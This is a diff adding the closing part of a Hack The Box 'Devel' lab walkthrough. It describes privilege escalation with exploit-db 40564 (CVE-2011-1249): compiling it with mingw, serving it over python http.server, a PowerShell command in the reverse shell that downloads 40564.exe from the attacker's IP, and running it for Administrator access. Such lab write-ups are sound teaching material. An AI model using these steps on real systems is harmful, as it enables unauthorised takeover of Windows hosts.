@@ -58,3 +58,20 @@ But when i try change directory i see some problems on babies and Administrator
 First my step is write systeminfo and find some exploit.
 
 ![obraz](https://github.com/Anogota/HTB-Devel/assets/143951834/727bb89e-f152-41f7-80ef-a70a63e46254)
+
+Found something on exploit-db CVE number CVE:2011-1249
+in this part if you don't have mingw-w64 you need to instal by this command: sudp apt-get install mingw-w64 -y 
+I coppy this exploit by: searchsploit -m 40564 
+and here is the steps to compilate this exploit:
+i686-w64-mingw32-gcc 40564.c -o 40564.exe -lws2_32
+and we will get 40564.exe if u have this now you need to upload this exploit on the reverse-shell, first step is to turn on the: python -m http.server 
+And write this command on reverse-shell to download this exploit
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.16.14:8000/40564.exe', 'c:\Users\Public\Downloads\40564.exe')"
+After the exploit is download we need to traffic, to c:\Users\Public\Downloads and there execute as exploit by only typing 40564.exe and we got this, access to Administrator :)
+
+![obraz](https://github.com/Anogota/HTB-Devel/assets/143951834/576969fc-ee1f-4de9-a1d1-344893d56bcb)
+
+![obraz](https://github.com/Anogota/HTB-Devel/assets/143951834/7dfc66b5-b17e-4fd9-8b40-903860571efb)
+
+If u see this, this my first Walkthrough write in English, i hope you enjoy and have fun with my solving this lab. I promise you i will write better next by next Walkthrough and much clearer.
+Thank You :P
